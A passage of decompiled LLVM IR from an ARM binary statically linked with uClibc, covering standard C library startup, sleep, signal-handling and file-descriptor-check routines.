dec_label_pc_13670:                               ; preds = %dec_label_pc_13630
  %v2_13670 = load i32, i32* %stack_var_-424, align 4
  %v7_13674 = icmp eq i32 %v2_13670, 1
  %v2_1367c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1367c, i32* @r4, align 4
  br i1 %v7_13674, label %dec_label_pc_13684, label %dec_label_pc_136b8

dec_label_pc_13684:                               ; preds = %dec_label_pc_13670
  store i32 %v2_1367c, i32* %r1.global-to-local, align 4
  store i32 %v2_1367c, i32* %r0.global-to-local, align 4
  %v2_1368c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_1368c = call i32 @__libc_nanosleep(%timespec* %v2_1368c, i32 %v2_1367c)
  store i32 %v3_1368c, i32* %r0.global-to-local, align 4
  store i32 %v3_1368c, i32* %r6.global-to-local, align 4
  %v0_13694 = call i32 @__errno_location()
  store i32 %v2_135cc, i32* %r1.global-to-local, align 4
  store i32 %v0_13694, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_136a8 = inttoptr i32 %v0_13694 to i32*
  %v2_136a8 = load i32, i32* %v1_136a8, align 4
  store i32 %v2_136a8, i32* @r4, align 4
  %v3_136ac = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_136ac = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_136ac, i32 0)
  store i32 %v4_136ac, i32* %r0.global-to-local, align 4
  %v0_136b0 = load i32, i32* @r4, align 4
  %v1_136b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_136b0 = inttoptr i32 %v1_136b0 to i32*
  store i32 %v0_136b0, i32* %v2_136b0, align 4
  %v0_136e0.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_136e0

dec_label_pc_136b8:                               ; preds = %dec_label_pc_13670
  store i32 %v2_135cc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_136c4 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_136c4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_136c4, i32 0)
  store i32 %v4_136c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136d4

dec_label_pc_136d4:                               ; preds = %dec_label_pc_135e8.dec_label_pc_136d4_crit_edge, %dec_label_pc_136b8
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_135e8.dec_label_pc_136d4_crit_edge ], [ %v2_1367c, %dec_label_pc_136b8 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_136d8 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_136d8 = call i32 @__libc_nanosleep(%timespec* %v2_136d8, i32 %storemerge.pre-phi)
  store i32 %v3_136d8, i32* %r0.global-to-local, align 4
  store i32 %v3_136d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_136e0

dec_label_pc_136e0:                               ; preds = %dec_label_pc_13684, %dec_label_pc_136d4
  %v0_136e0 = phi i32 [ %v0_136e0.pr, %dec_label_pc_13684 ], [ %v3_136d8, %dec_label_pc_136d4 ]
  %v2_136e0 = icmp eq i32 %v0_136e0, 0
  br i1 %v2_136e0, label %dec_label_pc_13704, label %dec_label_pc_136e8

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136e0
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_136f0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_136f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13710

dec_label_pc_13704:                               ; preds = %entry, %dec_label_pc_136e0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13710

dec_label_pc_1370c:                               ; preds = %dec_label_pc_135cc, %dec_label_pc_1361c, %dec_label_pc_135a8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13710

dec_label_pc_13710:                               ; preds = %dec_label_pc_136e8, %dec_label_pc_13704, %dec_label_pc_13648, %dec_label_pc_1370c
  %v17_13714 = phi i32 [ %v3_136f0, %dec_label_pc_136e8 ], [ 0, %dec_label_pc_13704 ], [ %v17_13714.pre, %dec_label_pc_13648 ], [ -1, %dec_label_pc_1370c ]
  %v2_13714 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13714, i32* @r4, align 4
  store i32 %v6_13578, i32* @r5, align 4
  store i32 %v9_13578, i32* @r6, align 4
  ret i32 %v17_13714

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_1367c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_1360c, { 0, 2, 1 }
  uselistorder i32 %v2_135cc, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_135c4, { 1, 0, 2 }
  uselistorder i32 %v1_13598, { 0, 2, 1 }
  uselistorder i32 %v16_13578, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 1 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_13710, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1370c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13704, { 1, 0 }
  uselistorder label %dec_label_pc_136e0, { 1, 0 }
  uselistorder label %dec_label_pc_136d4, { 1, 0 }
  uselistorder label %dec_label_pc_13604, { 1, 0 }
  uselistorder label %dec_label_pc_13590, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1371c = load i32, i32* @r4, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_13730 = udiv i32 %arg1, 1000000
  store i32 %v2_13730, i32* %stack_var_-20, align 4
  %v2_13758 = bitcast i32* %stack_var_-20 to %timespec*
  %v3_13758 = call i32 @__libc_nanosleep(%timespec* %v2_13758, i32 0)
  store i32 %v3_1371c, i32* @r4, align 4
  ret i32 %v3_13758

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_13794:
  %stack_var_-8 = alloca i32, align 4
  %v3_13768 = load i32, i32* @r4, align 4
  store i32 %v3_13768, i32* %stack_var_-8, align 4
  %v2_13798 = load i32, i32* @global_var_29d74.812, align 4
  %v2_1379c = icmp eq i32 %v2_13798, 0
  br i1 %v2_1379c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13794
  call void @__pseudo_branch(i32 %v2_13798)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13794, %bb
  %v2_137ac = load i32, i32* @global_var_29d78.814, align 4
  %v2_137b0 = icmp eq i32 %v2_137ac, 0
  br i1 %v2_137b0, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_137b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_137b4, i32* @r4, align 4
  %v9_137b4 = load i32, i32* @r0, align 4
  ret i32 %v9_137b4

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_137ac)
  %v2_137c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_137c0, i32* @r4, align 4
  %v8_137c0 = load i32, i32* @r0, align 4
  ret i32 %v8_137c0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_137dc = load i32, i32* @r0, align 4
  ret i32 %v1_137dc
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_137e0 = load i32, i32* @r4, align 4
  store i32 %v3_137e0, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_137f0 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_137f4 = icmp eq i32 %v2_137f0, -1
  br i1 %v7_137f4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_137f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_137f8, i32* @r4, align 4
  ret i32 %v2_137f0

bb4:                                              ; preds = %entry
  %v0_137fc = load i32, i32* @r4, align 4
  %v4_13804 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ace0.817, i32 0, i32 0), i32 %v0_137fc)
  %v1_13808 = load i32, i32* %r5.global-to-local, align 4
  %v9_13808 = icmp eq i32 %v4_13804, %v1_13808
  br i1 %v9_13808, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_1380c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1380c, i32* @r4, align 4
  ret i32 %v4_13804

bb6:                                              ; preds = %bb4
  %v0_13810 = call i32 @abort()
  %v0_13814 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13814, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_13810

; uselistorder directives
  uselistorder i32 %v2_137f0, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1381c = load i32, i32* @global_var_29d7c.819, align 4
  %v2_13820 = icmp eq i32 %v2_1381c, 0
  br i1 %v2_13820, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_1382c = load i32, i32* @r0, align 4
  ret i32 %v6_1382c

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_29d7c.819, align 4
  store i32 4096, i32* @global_var_29d70.579, align 4
  %v0_13860 = call i32 @_stdio_init()
  ret i32 %v0_13860
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_13878 = mul i32 %arg2, 4
  %v5_13878 = add i32 %tmp, %v4_13878
  %v2_1387c = load i32, i32* %arg3, align 4
  %v2_13880 = ptrtoint i32* %stack_var_-120 to i32
  %v1_13884 = add i32 %v5_13878, 4
  store i32 %v1_13884, i32* @ip, align 4
  %v9_13888 = icmp eq i32 %v1_13884, %v2_1387c
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_29d68.825, align 4
  store i32 %v1_13884, i32* @global_var_29d6c.805, align 4
  store i32 %arg6, i32* @global_var_29d78.814, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_13888, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_13878, i32* @global_var_29d6c.805, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_138c8 = bitcast i32* %stack_var_-120 to i8*
  %v3_138c8 = call i32 @__GI_memset(i8* %v2_138c8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_29d6c.805, align 4
  br label %dec_label_pc_138d8

dec_label_pc_138d8:                               ; preds = %dec_label_pc_138d8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_138d8, %dec_label_pc_138d8 ]
  %v1_138d8 = inttoptr i32 %storemerge to i32*
  %v2_138d8 = load i32, i32* %v1_138d8, align 4
  %v4_138d8 = add i32 %storemerge, 4
  %v2_138dc = icmp eq i32 %v2_138d8, 0
  br i1 %v2_138dc, label %dec_label_pc_138e8, label %dec_label_pc_138d8

dec_label_pc_138e8:                               ; preds = %dec_label_pc_138d8
  store i32 %v4_138d8, i32* @r4, align 4
  %v1_1390822 = inttoptr i32 %v4_138d8 to i32*
  %v2_1390823 = load i32, i32* %v1_1390822, align 4
  %v2_1390c25 = icmp eq i32 %v2_1390823, 0
  br i1 %v2_1390c25, label %dec_label_pc_13914, label %dec_label_pc_138f0

dec_label_pc_138f0:                               ; preds = %dec_label_pc_138e8, %dec_label_pc_13908
  %v5_138f4 = phi i32 [ %v2_13908, %dec_label_pc_13908 ], [ %v2_1390823, %dec_label_pc_138e8 ]
  %v2_138f0 = icmp ugt i32 %v5_138f4, 13
  %v7_138f0 = icmp eq i32 %v5_138f4, 14
  %v2_138f4 = xor i1 %v2_138f0, true
  %v3_138f4 = or i1 %v7_138f0, %v2_138f4
  br i1 %v3_138f4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_138f0
  %v6_138f4 = and i32 %v5_138f4, 536870912
  %v7_138f4 = icmp ne i32 %v6_138f4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_138f0, %bb42
  %v1_13900 = phi i1 [ %v2_138f0, %dec_label_pc_138f0 ], [ %v7_138f4, %bb42 ]
  %v2_138f8 = xor i1 %v1_13900, true
  %v3_138f8 = or i1 %v7_138f0, %v2_138f8
  br i1 %v3_138f8, label %bb44, label %dec_label_pc_13908

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_13908

dec_label_pc_13908:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_138f8, i32 ptrtoint (i32* @global_var_11770.828 to i32))
  %v0_13904 = load i32, i32* @r4, align 4
  %v1_13904 = add i32 %v0_13904, 8
  store i32 %v1_13904, i32* @r4, align 4
  %v1_13908 = inttoptr i32 %v1_13904 to i32*
  %v2_13908 = load i32, i32* %v1_13908, align 4
  %v2_1390c = icmp eq i32 %v2_13908, 0
  br i1 %v2_1390c, label %dec_label_pc_13914, label %dec_label_pc_138f0

dec_label_pc_13914:                               ; preds = %dec_label_pc_13908, %dec_label_pc_138e8
  %v1_13918 = call i32 @_dl_aux_init(i32 %v2_13880)
  store i32 %v1_13918, i32* @r0, align 4
  %v1_1391c = call i32 @__GI___uClibc_init(i32 %v1_13918)
  store i32 %v1_1391c, i32* @r0, align 4
  %v2_13928 = icmp eq i32 %tmp37, 0
  br i1 %v2_13928, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_13914
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_13914, %bb45
  %v0_13938 = phi i32 [ %tmp37, %dec_label_pc_13914 ], [ 4096, %bb45 ]
  %v3_13930 = icmp eq i32 %tmp36, -1
  %v8_13930 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_29d70.579 to i32), i32* @r2, align 4
  store i32 %v0_13938, i32* @global_var_29d70.579, align 4
  br i1 %v3_13930, label %dec_label_pc_13940, label %dec_label_pc_13968

dec_label_pc_13940:                               ; preds = %bb46
  %v0_13940 = call i32 @getuid()
  store i32 %v0_13940, i32* @r0, align 4
  store i32 %v0_13940, i32* @r4, align 4
  %v0_13948 = call i32 @geteuid()
  %v0_1394c = load i32, i32* @r4, align 4
  %v9_1394c = icmp eq i32 %v0_1394c, %v0_13948
  br i1 %v9_1394c, label %dec_label_pc_13954, label %dec_label_pc_13990

dec_label_pc_13954:                               ; preds = %dec_label_pc_13940
  %v1_13954 = call i32 @getgid(i32 %v0_13948)
  store i32 %v1_13954, i32* @r0, align 4
  store i32 %v1_13954, i32* @r4, align 4
  %v0_1395c = call i32 @getegid()
  %v0_13960 = load i32, i32* @r4, align 4
  %v9_13960 = icmp eq i32 %v0_13960, %v0_1395c
  br i1 %v9_13960, label %dec_label_pc_13968, label %dec_label_pc_13990

dec_label_pc_13968:                               ; preds = %dec_label_pc_13954, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_13930, label %dec_label_pc_139fc, label %dec_label_pc_13974

dec_label_pc_13974:                               ; preds = %dec_label_pc_13968
  %v9_13978 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_13978, label %dec_label_pc_13980, label %dec_label_pc_13990

dec_label_pc_13980:                               ; preds = %dec_label_pc_13974
  br label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %dec_label_pc_13980, %dec_label_pc_13974, %dec_label_pc_13954, %dec_label_pc_13940
  %v2_13998 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_139a4 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_139b0 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_139fc

dec_label_pc_139fc:                               ; preds = %dec_label_pc_13990, %dec_label_pc_13968
  %v0_139c0 = load i32, i32* @r6, align 4
  %v1_139c0 = inttoptr i32 %v0_139c0 to i32*
  %v2_139c0 = load i32, i32* %v1_139c0, align 4
  store i32 %v2_139c0, i32* @global_var_23ae0, align 4
  store i32 %arg5, i32* @global_var_29d74.812, align 4
  %v2_139fc = icmp eq i32 %arg4, 0
  br i1 %v2_139fc, label %dec_label_pc_13a38, label %bb47

bb47:                                             ; preds = %dec_label_pc_139fc
  br label %dec_label_pc_13a38

dec_label_pc_13a38:                               ; preds = %dec_label_pc_139fc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_13a48 = call i32 @__errno_location()
  %v2_13a50 = inttoptr i32 %v1_13a48 to i32*
  store i32 0, i32* %v2_13a50, align 4
  %v1_13a64 = call i32 @__GI___h_errno_location()
  %v2_13a6c = inttoptr i32 %v1_13a64 to i32*
  store i32 0, i32* %v2_13a6c, align 4
  %v0_13a7c = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_13a88 = call i32 @__GI_exit(i32 %v0_13a7c)
  ret i32 %v1_13a88

; uselistorder directives
  uselistorder i32 %v2_13908, { 1, 0 }
  uselistorder i32 %v1_13904, { 1, 0 }
  uselistorder i1 %v2_138f0, { 1, 0 }
  uselistorder i32 %v4_138d8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_29d70.579, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 4096, { 2, 3, 13, 6, 14, 4, 1, 10, 5, 7, 8, 11, 12, 0, 9 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13a38, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_13908, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_138f0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_13ac0 = load i32, i32* @r4, align 4
  %v6_13ac0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_13ac4 = icmp eq i32* %arg2, null
  %v2_13ac8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_13ac4, label %dec_label_pc_13b34, label %dec_label_pc_13ad8

dec_label_pc_13ad8:                               ; preds = %entry
  %v2_13adc = load i32, i32* %arg2, align 4
  %v4_13adc = add i32 %tmp, 4
  store i32 %v4_13adc, i32* @r1, align 4
  %v2_13ae0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_13ae0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_13adc, i32* %stack_var_-156, align 4
  %v0_13aec = call i32 @memcpy()
  store i32 %v0_13aec, i32* %r0.global-to-local, align 4
  %v0_13af0 = load i32, i32* @r4, align 4
  %v1_13af0 = add i32 %v0_13af0, 132
  %v2_13af0 = inttoptr i32 %v1_13af0 to i32*
  %v3_13af0 = load i32, i32* %v2_13af0, align 4
  %v1_13af4 = and i32 %v3_13af0, 67108864
  %v2_13af4 = icmp eq i32 %v1_13af4, 0
  br i1 %v2_13af4, label %dec_label_pc_13b08, label %bb

bb:                                               ; preds = %dec_label_pc_13ad8
  br label %dec_label_pc_13b24

dec_label_pc_13b08:                               ; preds = %dec_label_pc_13ad8
  %v1_13b10 = and i32 %v3_13af0, 4
  %v2_13b10 = icmp eq i32 %v1_13b10, 0
  br i1 %v2_13b10, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_13b08
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_13b08, %bb20
  br label %dec_label_pc_13b24

dec_label_pc_13b24:                               ; preds = %bb, %bb21
  %v2_13b24 = icmp eq i32 %v0_13af0, 0
  %v3_13b28 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_13b28 = select i1 %v2_13b24, i32 0, i32 %v3_13b28
  %v0_13b34.pre = load i32, i32* @r5, align 4
  %v0_13b44.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13b34

dec_label_pc_13b34:                               ; preds = %dec_label_pc_13b24, %entry
  %v0_13b44 = phi i32 [ %arg1, %entry ], [ %v0_13b44.pre, %dec_label_pc_13b24 ]
  %v0_13b34 = phi i32 [ %arg3, %entry ], [ %v0_13b34.pre, %dec_label_pc_13b24 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_13b28, %dec_label_pc_13b24 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_13b34 = icmp eq i32 %v0_13b34, 0
  %.v2_13ac8 = select i1 %v2_13b34, i32 0, i32 %v2_13ac8
  store i32 %.v2_13ac8, i32* @r2, align 4
  store i32 %v0_13b44, i32* %r0.global-to-local, align 4
  %v1_13b48 = call i32 @__syscall_rt_sigaction(i32 %v0_13b44)
  store i32 %v1_13b48, i32* %r0.global-to-local, align 4
  %v0_13b4c = load i32, i32* @r5, align 4
  %v2_13b4c = icmp eq i32 %v0_13b4c, 0
  br i1 %v2_13b4c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_13b34
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_13b34, %bb25
  %v0_13b5c.pr = phi i32 [ 0, %dec_label_pc_13b34 ], [ 1, %bb25 ]
  %v1_13b54 = icmp slt i32 %v1_13b48, 0
  br i1 %v1_13b54, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_13b90

thread-pre-split:                                 ; preds = %bb26
  %v2_13b5c = icmp eq i32 %v0_13b5c.pr, 0
  store i32 %v1_13b48, i32* @r4, align 4
  br i1 %v2_13b5c, label %dec_label_pc_13b90, label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %thread-pre-split
  %v2_13b68 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_13b4c, i32* %r0.global-to-local, align 4
  %v2_13b70 = inttoptr i32 %v0_13b4c to i32*
  store i32 %v2_13b68, i32* %v2_13b70, align 4
  %v3_13b70 = load i32, i32* %r0.global-to-local, align 4
  %v4_13b70 = add i32 %v3_13b70, 4
  store i32 %v4_13b70, i32* @r0, align 4
  %v2_13b74 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_13b74, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_13b7c = call i32 @memcpy()
  store i32 %v0_13b7c, i32* %r0.global-to-local, align 4
  %v1_13b84 = load i32, i32* @r5, align 4
  %v2_13b84 = add i32 %v1_13b84, 136
  %v3_13b84 = inttoptr i32 %v2_13b84 to i32*
  %v1_13b8c = load i32, i32* @r5, align 4
  %v2_13b8c = add i32 %v1_13b8c, 132
  %v3_13b8c = inttoptr i32 %v2_13b8c to i32*
  %v0_13b90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13b90

dec_label_pc_13b90:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_13b68
  %v0_13b90 = phi i32 [ %v1_13b48, %thread-pre-split ], [ %v0_13b90.pre, %dec_label_pc_13b68 ], [ %v1_13b48, %thread-pre-split.thread ]
  store i32 %v0_13b90, i32* %r0.global-to-local, align 4
  store i32 %v3_13ac0, i32* @r4, align 4
  store i32 %v6_13ac0, i32* @r5, align 4
  ret i32 %v0_13b90

; uselistorder directives
  uselistorder i32 %v0_13b90, { 1, 0 }
  uselistorder i32 %v0_13b4c, { 1, 0, 2 }
  uselistorder i32 %v0_13b44, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_13b90, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_13b24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_13ba4 = load i32, i32* @r4, align 4
  store i32 %v3_13ba4, i32* %stack_var_-8, align 4
  %v0_13ba8 = load i32, i32* @r0, align 4
  %v0_13bac = call i32 @__errno_location()
  %v1_13bb0 = sub i32 0, %v0_13ba8
  %v2_13bb4 = inttoptr i32 %v0_13bac to i32*
  store i32 %v1_13bb0, i32* %v2_13bb4, align 4
  %v2_13bbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13bbc, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_13bc0 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_13bc0
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_13bc4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_13bc4
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13bc8 = load i32, i32* @r4, align 4
  store i32 %v3_13bc8, i32* %stack_var_-8, align 4
  %v1_13bcc = load i32, i32* @r1, align 4
  %v2_13bcc = inttoptr i32 %v1_13bcc to %sigaction*
  %v3_13bcc = load i32, i32* @r2, align 4
  %v4_13bcc = inttoptr i32 %v3_13bcc to %sigaction*
  %v5_13bcc = call i32 @sigaction(i32 %arg1, %sigaction* %v2_13bcc, %sigaction* %v4_13bcc)
  store i32 %v5_13bcc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13bcc, -4095
  br i1 %tmp, label %dec_label_pc_13bec, label %dec_label_pc_13bdc

dec_label_pc_13bdc:                               ; preds = %entry
  %v0_13bdc = call i32 @__errno_location()
  %v0_13be0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13be0 = sub i32 0, %v0_13be0
  %v2_13be4 = inttoptr i32 %v0_13bdc to i32*
  store i32 %v1_13be0, i32* %v2_13be4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13bec

dec_label_pc_13bec:                               ; preds = %entry, %dec_label_pc_13bdc
  %v0_13bec = phi i32 [ %v5_13bcc, %entry ], [ -1, %dec_label_pc_13bdc ]
  %v2_13bf0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13bf0, i32* %r4.global-to-local, align 4
  ret i32 %v0_13bec

; uselistorder directives
  uselistorder i32 %v5_13bcc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13bec, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13bf4 = load i32, i32* @r4, align 4
  store i32 %v3_13bf4, i32* %stack_var_-8, align 4
  %v0_13bf8 = load i32, i32* @r0, align 4
  %v1_13bf8 = inttoptr i32 %v0_13bf8 to i8*
  %v2_13bf8 = load i32, i32* @r1, align 4
  %v3_13bf8 = inttoptr i32 %v2_13bf8 to i8*
  %v4_13bf8 = insertvalue [1 x i8*] undef, i8* %v3_13bf8, 0
  %v5_13bf8 = load i32, i32* @r2, align 4
  %v6_13bf8 = inttoptr i32 %v5_13bf8 to i8*
  %v7_13bf8 = insertvalue [1 x i8*] undef, i8* %v6_13bf8, 0
